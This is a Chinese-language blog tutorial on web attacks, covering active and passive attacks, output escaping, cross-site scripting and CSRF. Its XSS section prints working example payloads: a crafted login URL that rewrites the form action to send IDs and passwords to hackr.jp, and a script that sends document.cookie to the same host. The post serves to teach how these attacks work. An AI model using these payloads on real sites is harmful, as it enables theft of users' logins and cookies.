---
author: Brian Hu
pubDatetime: 2017-09-09T03:38:05.000Z
title: 认识 HTTP Web 安全与攻击手段
postSlug: 认识 HTTP Web 安全与攻击手段
featured: false
draft: false
tags:
  - HTTP
ogImage: "https://res.cloudinary.com/dewu7okpv/image/upload/v1675676448/blog/4337988-3b2645de43c3de0c.png_bbmtjo.png"
description: 目前，互联网攻击大多是针对应用HTTP协议的服务器和客户端，以及运行在服务器上的Web应用等资源，本文主要针对Web应用的攻击技术进行简单分析。
---

**本文内容大多参考[《图解 HTTP》一书](https://book.douban.com/subject/25863515/)**

## 关于 Web 的攻击手段

目前，互联网攻击大多是针对应用 HTTP 协议的服务器和客户端，以及运行在服务器上的 Web 应用等资源，本文主要针对 Web 应用的攻击技术进行简单分析。

### 针对 Web 应用的攻击模式

对 Web 应用的攻击模式有以下两种。

- 主动攻击
  主动攻击（active attack）是指攻击者通过直接访问 Web 应用，把攻击代码传入的攻击模式。由于该模式是直接针对服务器上的资源进行攻击，因此攻击者需要能够访问到那些资源。

![这个攻击者没法吐槽](https://res.cloudinary.com/dewu7okpv/image/upload/v1675676448/blog/4337988-3b2645de43c3de0c.png_bbmtjo.png)

- 被动攻击
  被动攻击（passive attack）是指利用圈套策略执行攻击代码的攻击模式。在被动攻击过程中，攻击者不直接对目标 Web 应用访问发起攻击。
  被动攻击通常的攻击模式如下所示。

1. 攻击者诱使用户触发已设置好的陷阱，而陷阱会启动发送已嵌入攻击代码的 HTTP 请求。
2. 当用户不知不觉中招之后，用户的浏览器或邮件客户端就会触发这个陷阱。
3. 中招后的用户浏览器会把含有攻击代码的 HTTP 请求发送给作为攻击目标的 Web 应用，运行攻击代码。
4. 执行完攻击代码，存在安全漏洞的 Web 应用会成为攻击者的跳板，可能导致用户所持的 Cookie 等个人信息被窃取，登录状态中的用户权限遭恶意滥用等后果。被动攻击模式中具有代表性的攻击是跨站脚本攻击（xss）和跨站点请求伪造（CSRF/XSRF）。

![](https://res.cloudinary.com/dewu7okpv/image/upload/v1675676463/blog/4337988-72423c77abb5909d.png_jgdwfg.png)

### 因输出值转义不完全引发的安全漏洞

实施 Web 应用的安全对策可大致分为以下两部分。

- 客户端验证
- Web 应用端（服务器）验证
  - 输入值验证
  - 输出值转义

![](https://res.cloudinary.com/dewu7okpv/image/upload/v1675676575/blog/4337988-511ebfb85ffa5947.png_txdspx.png)

多数情况下采用 JavaScript 在客户端验证数据。可是在客户端允许篡改数据或关闭 JavaScript，不适合将 JavaScript 验证作为安全的防范对策。保留客户端验证只是为了尽早地辨识输入错误，起到提高 UI 体验的作用。
Web 应用端的输入值验证按 Web 应用内的处理则有可能被误认为是具有攻击性意义的代码。输入值验证通常是指检查是否是符合系统业务逻辑的数值或检查字符编码等预防对策。
从数据库或文件系统、HTML、邮件等输出 Web 应用处理的数据之际，针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传入的攻击代码，而给输出对象带来损害。

## 跨站脚本攻击（XSS）

跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的 HTML 标签或者 Javascript 的一种攻击。就这样，攻击者编写脚本设下陷阱，用户在自己的浏览器上运行时，一不小心就会受到被动攻击。
跨站脚本攻击有可能造成以下影响：

- 利用虚假输入表单骗取用户个人信息。
- 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
- 显示伪造的文章或图片（莫名其妙的广告）。

### 简单例子

**在动态生成 HTML 处发生：**

下面以编辑个人信息页面为例讲解跨站脚本攻击。下方界面显示了用户输入的个人信息内容。

![跨站脚本攻击案例](https://res.cloudinary.com/dewu7okpv/image/upload/v1675676474/blog/4337988-f42a8f9323739e75.png_cirsin.png)

确认界面按原样显示在编辑界面输入的字符串。此处输入带有山口
一郎这样的 HTML 标签的字符串。

![按照输入内容原样显示的机制](https://res.cloudinary.com/dewu7okpv/image/upload/v1675676487/blog/4337988-ec25584204f71ee4.png_tumma4.png)

此时的确认界面上，浏览器会把用户输入的`<s>` 解析成 HTML 标签，然后显示删除线。
删除线显示出来并不会造成太大的不利后果，但如果换成使用 script 标签将会如何呢。

## XSS 是攻击者利用预先设置的陷阱触发的被动攻击

跨站脚本攻击属于被动攻击模式，因此攻击者会事先布置好用于攻击的陷阱。
下图网站通过地址栏中 URI 的查询字段指定 ID，即相当于在表单内自动填写字符串的功能。而就在这个地方，隐藏着可执行跨站脚本攻击的漏洞。

![](https://res.cloudinary.com/dewu7okpv/image/upload/v1675676499/blog/4337988-23e6fa19d23f219e.png_f3ilku.png)
充分熟知此处漏洞特点的攻击者，于是就创建了下面这段嵌入恶意代码的 URL。并隐藏植入事先准备好的欺诈邮件中或 Web 页面内，诱使用户去点击该 URL。

```
http://example.jp/login?ID="><script>var+f=document⇒
.getElementById("login");+f.action="http://hackr.jp/pwget";+f.method=⇒
"get";</script><span+s="
```

浏览器打开该 URI 后，直观感觉没有发生任何变化，但设置好的脚本却偷偷开始运行了。当用户在表单内输入 ID 和密码之后，就会直接发送到攻击者的网站（也就是 hackr.jp），导致个人登录信息被窃取。

![](https://res.cloudinary.com/dewu7okpv/image/upload/v1675676515/blog/4337988-d9c24bd7a2426f2b.png_akdyml.png)

之后，ID 及密码会传给该正规网站，而接下来仍然是按正常登录步骤，用户很难意识到自己的登录信息已遭泄露。

**对 http://example.jp/login?ID=yama 请求时对应的 HTML 源代码（摘录）**

```html
<div class="logo">![](/img/logo.gif)</div>
<form action="http://example.jp/login" method="post" id="login">
  <div class="input_id">ID <input type="text" name="ID" value="yama" /></div>
</form>
```

```html
**http://example.jp/login?ID="><script>var+f=document.getElementById
("login");+f.action="http://hackr.jp/pwget";+f.method="get";</script>
<span+s="对请求时对应的HTML源代码（摘录）**
```

```html
<div class="logo">![](/img/logo.gif)</div>
<form action="http://example.jp/login" method="post" id="login">
  <div class="input_id">
    ID <input type="text" name="ID" value="" />
    <script>
      var f=document⇒
      .getElementById("login"); f.action="http://hackr.jp/pwget"; f.method=⇒
      "get";
    </script>
    <span s="" />
  </div>
</form>
```

### 对用户 Cookie 的窃取攻击

除了在表单中设下圈套之外，下面那种恶意构造的脚本同样能够以跨站脚本攻击的方式，窃取到用户的 Cookie 信息。
`<script src=http://hackr.jp/xss.js></script>`
该脚本内指定的http://hackr.jp/xss.js 文件。即下面这段采用 JavaScript 编写的代码。

```js
var content = escape(document.cookie);
document.write("<img src=http://hackr.jp/?");
document.write(content);
document.write(">");
```

在存在可跨站脚本攻击安全漏洞的 Web 应用上执行上面这段 JavaScript 程序，即可访问到该 Web 应用所处域名下的 Cookie 信息。然后这些信息会发送至攻击者的 Web 网站（http://hackr.jp/），记录在他的登录日志中。结果，攻击者就这样窃取到用户的Cookie 信息了。

![使用XSS 攻击夺取Cookie 信息](https://res.cloudinary.com/dewu7okpv/image/upload/v1675676534/blog/4337988-73e389217a5eca2a.png_sjfqmj.png)

## 跨站点请求伪造(CSRF)

跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。
跨站点请求伪造有可能会造成以下等影响。

- 利用已通过认证的用户权限更新设定信息等
- 利用已通过认证的用户权限购买商品
- 利用已通过认证的用户权限在留言板上发表言论

### 跨站点请求伪造的攻击案例

下面以留言板功能为例，讲解跨站点请求伪造。该功能只允许已认证并登录的用户在留言板上发表内容。

![跨站点请求伪造的攻击案例](https://res.cloudinary.com/dewu7okpv/image/upload/v1675676550/blog/4337988-aa8130ff059c20c4.png_vs3atg.png)

在该留言板系统上，受害者用户 A 是已认证状态。它的浏览器中的 Cookie 持有已认证的会话 ID（步骤 ①）
攻击者设置好一旦用户访问，即会发送在留言板上发表非主观行为产生的评论的请求的陷阱。用户 A 的浏览器执行完陷阱中的请求后，留言板上也就会留下那条评论（步骤 ②）。
触发陷阱之际，如果用户 A 尚未通过认证，则无法利用用户 A 的身份权限在留言板上发表内容。
